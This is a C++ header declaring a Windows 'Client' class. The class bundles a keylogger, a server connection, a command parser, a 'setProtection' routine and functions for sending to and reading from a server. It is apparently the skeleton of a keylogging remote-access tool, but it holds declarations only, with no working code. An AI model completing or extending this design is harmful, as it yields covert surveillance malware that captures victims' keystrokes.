
#ifndef _CLIENT_HH_
# define _CLIENT_HH_
# define WIN32_LEAN_AND_MEAN 
#include <iostream>
#include <Windows.h>
#include <WinBase.h>
#include <winternl.h>
#include <Shellapi.h>
#include <boost/thread.hpp>
#include <boost/date_time.hpp>
#include <ClientWindow.h>
#include <Keylogger.hh>
#include <Connect.hh>
#include <ParseCmds.hh>

class				Client
{
public:
	Client();
	~Client();

	bool			init(const HINSTANCE & instance, const int & ac, LPWSTR *av);
	bool			setProtection();
	void			run();
	void			runAssholeMode();
	bool			isRunning();
	bool			isAsshole();
	void			execute(const t_trame & trame);

	Keylogger &		getKeylogger();
	Connect &		getConnect();

private:
	ClientWindow	_window;
	Keylogger		_keylogger;
	Connect			_connect;
	MSG				_msg;
	ParseCmds		_parser;
	bool			_running;
	bool			_assholeMode;
};

void			sendToServer(Client *);
void			readFromServer(Client* cl);

#endif _CLIENT_HH_